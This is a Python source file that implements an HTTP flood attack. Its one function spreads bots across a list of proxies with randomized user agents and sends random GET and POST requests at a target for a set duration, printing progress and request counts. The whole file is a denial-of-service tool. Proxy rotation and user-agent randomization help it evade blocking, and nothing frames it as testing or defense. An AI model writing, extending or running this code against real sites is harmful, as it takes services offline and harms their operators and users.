import time
from utils.http_bot import HTTPBot
from utils.random_utils import random_item, random_boolean, random_string

def start_flood_attack(target, proxies, user_agents, duration, packet_size):
    bots = [HTTPBot(proxy, random_item(user_agents)) for proxy in proxies]
    end_time = time.time() + duration
    total_requests = 0
    failed_requests = 0

    print(f"🚀 Starting HTTP Flood attack on {target} with {len(bots)} bots...")
    print(f"⏳ Duration: {duration} seconds | Packet size: {packet_size} bytes")

    while time.time() < end_time:
        for bot in bots:
            try:
                if random_boolean():
                    status = bot.get_request(target + "/" + random_string(packet_size))
                    print(f"✅ GET request to {target} | Status: {status}")
                else:
                    status = bot.post_request(target, random_string(packet_size))
                    print(f"✅ POST request to {target} | Status: {status}")
                total_requests += 1
            except Exception as e:
                print(f"❌ Request failed: {e}")
                failed_requests += 1
            time.sleep(0.1)

    print(f"🎉 Attack finished! Total requests sent: {total_requests}")
    print(f"❌ Failed requests: {failed_requests}")
